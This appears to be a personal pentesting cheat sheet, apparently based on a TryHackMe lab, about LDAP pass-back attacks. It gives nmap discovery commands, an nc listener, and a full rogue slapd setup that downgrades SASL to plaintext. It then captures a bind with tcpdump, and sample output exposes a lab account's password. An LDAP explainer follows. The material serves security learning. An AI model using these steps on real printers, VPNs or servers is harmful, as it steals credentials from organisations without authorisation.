--- ---

<h2>Find LDAP Port</h2>

- Nmap
```Terminal
nmap -sV -sC IP -p389,636
```

- Possible to find LDAP on an other port

---

<h2>Attack</h2>
Type of place to exploit LDAP (Servers)
-   Gitlab
-   Jenkins
-   Custom-developed web applications
-   Printers
-   VPNs  

- Example of what your looking for
		![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png)

Simple Netcat Lisener (Might not work)
```
# Find server (Ex:printer) on the network where there is credential saved (View Pics)
# Setup your Local IP in the field and try ti capture it with Netcat
nc -lvp 389

# Send request in the browser (If this dont work, follow the rogue server technique)
```

Rogue Server (create a server that dictate how data should be share) -> Plain text | Login
```
# Download Tools
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

sudo dpkg-reconfigure -p low slapd

# Create a new file (location does not matter)
touch olcSaslSecProps.ldif
nano olcSaslSecProps.ldif (Add the following)
	#olcSaslSecProps.ldif
	dn: cn=config
	replace: olcSaslSecProps
	olcSaslSecProps: noanonymous,minssf=0,passcred

# Restart the service
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

# Check permission
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

# Launch the server
sudo tcpdump -SX -i INTERFACE tcp port 389

# Send request in the browser (See Picture)
```

Output (Example)
```
...
win 8212, length 0
	0x0000:  4500 0028 b092 4000 8006 2128 0a0a 0ac9  E..(..@...!(....
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5010 2014 0ae4 0000 0000 0000 0000       P.............
10:41:52.989165 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65
	0x0000:  4500 0069 b093 4000 8006 20e6 0a0a 0ac9  E..i..@.........
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5018 2014 3afe 0000 3084 0000 003b 0201  P...:...0....;..
	0x0030:  0560 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..password11
```
- Example in this case the password is ---> password11

---

<h2>What is LDAP</h2>

LDAP (Lightweight Directory Access Protocol) is a protocol for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network. It is used to access and manage directory information that is organized in a hierarchical manner, similar to a file system. LDAP directories are commonly used to store information such as user names, passwords, and email addresses, as well as other types of information such as security certificates and encryption keys.

LDAP is based on the X.500 standard and can be used to authenticate users and to provide access to resources on a network. When a client application needs to authenticate a user or retrieve information from the directory, it sends a request to the LDAP server using the LDAP protocol. The LDAP server processes the request and returns the requested information to the client if the request is valid.

LDAP servers provide a centralized location for storing and managing directory information, and client applications can use LDAP to query the directory and retrieve the information they need. LDAP is often used in conjunction with other protocols, such as Kerberos, to provide secure authentication and authorization services for a network.

There are two commonly used ports for LDAP traffic: port 389 and port 636. Port 389 is the default port for LDAP and is used for unencrypted LDAP traffic. Port 636 is the default secure port for LDAP and is used for LDAP traffic encrypted with SSL/TLS (Secure Sockets Layer/Transport Layer Security).

LDAP can be exploited over a rogue LDAP server in a number of ways. For example, an attacker could set up a fake LDAP server and configure it to impersonate a legitimate LDAP server. The attacker could then use the fake server to capture and misuse the credentials (PORT 389) of users who try to authenticate with it. An attacker could also use a rogue LDAP server to inject malicious content into the directory, such as false or misleading information, or to manipulate the directory in other ways.